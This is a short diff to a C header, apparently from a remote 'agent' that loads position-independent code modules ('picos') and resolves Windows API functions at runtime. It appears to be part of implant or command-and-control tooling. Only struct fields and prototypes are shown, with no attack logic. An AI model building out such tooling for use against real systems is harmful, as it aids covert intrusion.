@@ -146,6 +146,7 @@ typedef struct AgentState {
 	HttpHandle *http;
 	AgentParams params;
 	DataVault file_vault;
+	WIN32FUNCS funcs;
 } AgentState;
 
 /*
@@ -189,8 +190,9 @@ char *unpack_str(char *raw_params, int *offset);
 void unpack_params(char *raw_params, AgentParams *params);
 void free_params(AgentParams *params);
 
+WIN32FUNCS resolve_pico_functions();
 void load_builtin_picos(DataVault *vault);
-BOOL resolve_loaded_pico(DataVault *vault, ResolvedPico *pico, char *key);
+BOOL resolve_loaded_pico(DataVault *vault, WIN32FUNCS *funcs, ResolvedPico *pico, char *key);
 void free_resolved_pico(ResolvedPico *pico);
 
 DataVault new_vault();
